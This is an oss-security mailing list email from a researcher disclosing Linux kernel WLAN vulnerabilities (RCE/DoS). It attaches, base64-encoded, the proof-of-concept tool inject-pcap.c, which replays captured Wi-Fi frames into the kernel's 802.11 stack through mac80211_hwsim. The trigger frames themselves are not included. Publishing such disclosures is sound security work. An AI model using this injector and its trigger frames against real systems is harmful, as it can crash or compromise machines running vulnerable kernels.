Received: (qmail 5428 invoked by uid 550); 13 Oct 2022 20:31:09 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 31955 invoked from network); 13 Oct 2022 20:16:03 -0000
Content-Type: multipart/mixed; boundary="------------Xg0hIyNkIaTxU284To93FJTO"
Message-ID: <e473c5b4-ec1e-4776-6fca-562bfb75f7d1@seemoo.tu-darmstadt.de>
Date: Thu, 13 Oct 2022 22:15:50 +0200
MIME-Version: 1.0
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101
 Thunderbird/102.3.2
Content-Language: en-US
From: =?UTF-8?Q?S=c3=b6nke_Huster?= <shuster@seemoo.tu-darmstadt.de>
To: Marcus Meissner <meissner@suse.de>, oss-security@lists.openwall.com
References: <20221013101046.GB20615@suse.de>
 <ff7256bc-418b-e833-18d8-bc9700f6d77e@seemoo.tu-darmstadt.de>
In-Reply-To: <ff7256bc-418b-e833-18d8-bc9700f6d77e@seemoo.tu-darmstadt.de>
X-Header-TUDa: 8Q2tXwBji1lAD2/4lBUrXHlKZMATFCkztSVfIuIqg7Am0njOzVt9esFxb3LvnxyTWnPoobkqH/gWK1rb6Vui5o
Subject: [oss-security] Re: Various Linux Kernel WLAN security issues (RCE/DOS) found

--------------Xg0hIyNkIaTxU284To93FJTO
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

Hello again,

On 13.10.22 19:13, Sönke Huster wrote:
> Hi everyone,
> 
> In the following, I quickly introduce the PoC and briefly describe each CVE.
> 
> Please see attached:
> * The PCAP files containing the Wifi frames triggering the vulnerabilities and
> * inject-pcap.c to inject the Wifi frames into the 802.11 stack
I forgot to attach the inject-pcap.c file that sends the frames, sorry for that!

Best
Sönke
--------------Xg0hIyNkIaTxU284To93FJTO
Content-Type: text/x-csrc; charset=UTF-8; name="inject-pcap.c"
Content-Disposition: attachment; filename="inject-pcap.c"
Content-Transfer-Encoding: base64

LyoKICogY2MgLW8gaW5qZWN0LXBjYXAgaW5qZWN0LXBjYXAuYyAkKHBrZy1j
b25maWcgLS1jZmxhZ3MgLS1saWJzICBsaWJubC0zLjAgbGlibmwtZ2VubC0z
LjAgbGlicGNhcCkKICovCgojaW5jbHVkZSA8bmV0bGluay9uZXRsaW5rLmg+
CiNpbmNsdWRlIDxuZXRsaW5rL2dlbmwvZ2VubC5oPgojaW5jbHVkZSA8bmV0
bGluay9nZW5sL2N0cmwuaD4KI2luY2x1ZGUgPG5ldC9pZi5oPgojaW5jbHVk
ZSA8c3RkaW8uaD4KI2luY2x1ZGUgPHN0ZGxpYi5oPgojaW5jbHVkZSA8c3lz
L2lvY3RsLmg+CiNpbmNsdWRlIDx1bmlzdGQuaD4KI2luY2x1ZGUgPHBjYXAv
cGNhcC5oPgoKI2RlZmluZSBIV1NJTV9DTURfUkVHSVNURVIgMQojZGVmaW5l
IEhXU0lNX0NNRF9GUkFNRSAyCgojZGVmaW5lIEhXU0lNX0FUVFJfQUREUl9S
RUNFSVZFUiAxCiNkZWZpbmUgSFdTSU1fQVRUUl9GUkFNRSAzCiNkZWZpbmUg
SFdTSU1fQVRUUl9SWF9SQVRFIDUKI2RlZmluZSBIV1NJTV9BVFRSX1NJR05B
TCA2CgojZGVmaW5lIENIRUNLKGNhbGwpIGRvIHsgaWYgKGNhbGwpIHsgZnBy
aW50ZihzdGRlcnIsICJwY2FwIGZhaWx1cmU6ICVzXG4iLCBlcnJidWYpOyBy
ZXR1cm4gMjsgfSB9IHdoaWxlICgwKQoKc3RhdGljIGludCBmYW1pbHk7Cgpz
dGF0aWMgdm9pZCBoYW5kbGVfcGt0KHVfY2hhciAqdXNlciwgY29uc3Qgc3Ry
dWN0IHBjYXBfcGt0aGRyICpoLCBjb25zdCB1X2NoYXIgKmJ5dGVzKQp7Cglz
dHJ1Y3QgbmxfbXNnICptc2cgPSBubG1zZ19hbGxvY19zaW1wbGUoMTAsIDAp
OwoJc3RydWN0IG5sX3NvY2sgKnNrID0gKHZvaWQgKil1c2VyOwoJaW50IGVy
cjsKCglnZW5sbXNnX3B1dChtc2csIE5MX0FVVE9fUE9SVCwgTkxfQVVUT19T
RVEsIGZhbWlseSwKCQkgICAgMCwgMCwgSFdTSU1fQ01EX0ZSQU1FLCAxKTsK
CglubGFfcHV0KG1zZywgSFdTSU1fQVRUUl9BRERSX1JFQ0VJVkVSLCA2LCAi
XHg0Mlx4MDBceDAwXHgwMFx4MDBceDAwIik7IAoJbmxhX3B1dF91MzIobXNn
LCBIV1NJTV9BVFRSX1JYX1JBVEUsIDApOwoJbmxhX3B1dF91MzIobXNnLCBI
V1NJTV9BVFRSX1NJR05BTCwgLTYwKTsKCW5sYV9wdXQobXNnLCBIV1NJTV9B
VFRSX0ZSQU1FLCBoLT5jYXBsZW4sIGJ5dGVzKTsKCgllcnIgPSBubF9zZW5k
X2F1dG8oc2ssIG1zZyk7CglpZiAoZXJyIDwgMCkKCQlwcmludGYoIkNhbid0
IHNlbmQgbXNnMTogJXNcbiIsIG5sX2dldGVycm9yKGVycikpOwoJbmxtc2df
ZnJlZShtc2cpOwp9CgppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqKmFyZ3Yp
CnsKCWNoYXIgZXJyYnVmW1BDQVBfRVJSQlVGX1NJWkVdOwoJaW50IHNvY2tm
ZDsKCXN0cnVjdCBpZnJlcSBpZnI7CglpbnQgZXJyLCBpZHg7CgoJaWYgKGFy
Z2MgPCAyKSB7CgkJZnByaW50ZihzdGRlcnIsICJ1c2FnZTogJXMgPHBjYXAg
ZmlsZXM+XG4iLCBhcmd2WzBdKTsKCQlyZXR1cm4gMjsKCX0KCglDSEVDSyhw
Y2FwX2luaXQoUENBUF9DSEFSX0VOQ19VVEZfOCwgZXJyYnVmKSk7CgoJc29j
a2ZkID0gc29ja2V0KEFGX0lORVQsIFNPQ0tfREdSQU0sIDApOwoKCWlmIChz
b2NrZmQgPCAwKSB7CgkJcHJpbnRmKCJDYW4ndCBvcGVuIHNvY2tldCB0byBy
ZXNldCBhZGFwdGVycyIpOwoJCWV4aXQoMSk7Cgl9CgoJc3RydWN0IG5sX3Nv
Y2sgKnNrID0gbmxfc29ja2V0X2FsbG9jKCk7CglpZiAoIXNrKSB7CgkJcHJp
bnRmKCJGYWlsZWQgdG8gYWxsb2NhdGUgc29ja2V0Iik7CgkJZXhpdCgxKTsK
CX0KCglpZiAoZ2VubF9jb25uZWN0KHNrKSA8IDApIHsKCQlwcmludGYoIkZh
aWxlZCB0byBjb25uZWN0IHNvY2tldCIpOwoJCWV4aXQoMSk7Cgl9CgoJZmFt
aWx5ID0gZ2VubF9jdHJsX3Jlc29sdmUoc2ssICJNQUM4MDIxMV9IV1NJTSIp
OwoKCWVyciA9IGdlbmxfc2VuZF9zaW1wbGUoc2ssIGZhbWlseSwgSFdTSU1f
Q01EX1JFR0lTVEVSLCAxLCAwKTsKCWlmIChlcnIgPCAwKSB7CgkJcHJpbnRm
KCJFcnJvciB3aGlsZSByZWdpc3RlcmluZzogJXNcbiIsIG5sX2dldGVycm9y
KGVycikpOwoJCWV4aXQoMSk7Cgl9CgoJbWVtc2V0KCZpZnIsIDAsIHNpemVv
ZiBpZnIpOwoJc3RybmNweShpZnIuaWZyX25hbWUsICJ3bGFuMCIsIElGTkFN
U0laKTsKCWlmci5pZnJfZmxhZ3MgfD0gSUZGX1VQOwoJaW9jdGwoc29ja2Zk
LCBTSU9DU0lGRkxBR1MsICZpZnIpOwoKCW1lbXNldCgmaWZyLCAwLCBzaXpl
b2YgaWZyKTsKCXN0cm5jcHkoaWZyLmlmcl9uYW1lLCAiaHdzaW0wIiwgSUZO
QU1TSVopOwoJaWZyLmlmcl9mbGFncyB8PSBJRkZfVVA7Cglpb2N0bChzb2Nr
ZmQsIFNJT0NTSUZGTEFHUywgJmlmcik7CgoJZm9yIChpZHggPSAxOyBpZHgg
PCBhcmdjOyBpZHgrKykgewoJCXBjYXBfdCAqaW5wdXQ7CgoJCWlucHV0ID0g
cGNhcF9vcGVuX29mZmxpbmUoYXJndltpZHhdLCBlcnJidWYpOwoJCUNIRUNL
KCFpbnB1dCk7CgoJCXBjYXBfbG9vcChpbnB1dCwgLTEsIGhhbmRsZV9wa3Qs
ICh2b2lkICopc2spOwoJfQp9Cg==

--------------Xg0hIyNkIaTxU284To93FJTO--
